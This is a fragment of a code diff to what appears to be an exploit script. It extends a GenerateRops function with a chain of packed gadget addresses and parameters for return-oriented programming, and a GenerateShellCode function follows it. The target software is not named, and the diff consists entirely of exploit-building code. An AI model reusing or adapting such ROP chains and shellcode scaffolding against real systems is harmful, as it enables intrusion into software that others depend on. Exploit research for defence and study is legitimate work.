@@ -58,8 +58,25 @@ def GenerateRops():
     rops += struct.pack("<L", 0x0000019f) #param 3
     rops += struct.pack("<L", 0x00008400) #param 2
     rops += struct.pack("<L", 0x00000003) #param 1
-    rops += struct.pack("<L", 0x0000a82d)
-    
+
+    rops += struct.pack("<L", 0x0003d25b)
+    rops += struct.pack("<L", 0x00055ff0)
+    rops += struct.pack("<L", 0x00099010)
+    rops += struct.pack("<L", 0x00000000)*4
+    rops += struct.pack("<L", 0x00009dcc)
+    rops += struct.pack("<L", 0x00000000)*3
+    rops += struct.pack("<L", 0x0003d25d)
+    rops += struct.pack("<L", 0x00000000)
+    rops += struct.pack("<L", 0x00000001)
+    rops += struct.pack("<L", 0x00050004)
+    rops += struct.pack("<L", 0x00055d34)
+    rops += struct.pack("<L", 0x00035674)
+    rops += struct.pack("<L", 0x00000000)*4
+    rops += struct.pack("<L", 0x00055d3c)
+    rops += struct.pack("<L", 0x00035015)
+    rops += struct.pack("<L", 0x00000000)
+    rops += struct.pack("<L", 0x000260A1)
+
     return rops
 
 def GenerateShellCode():
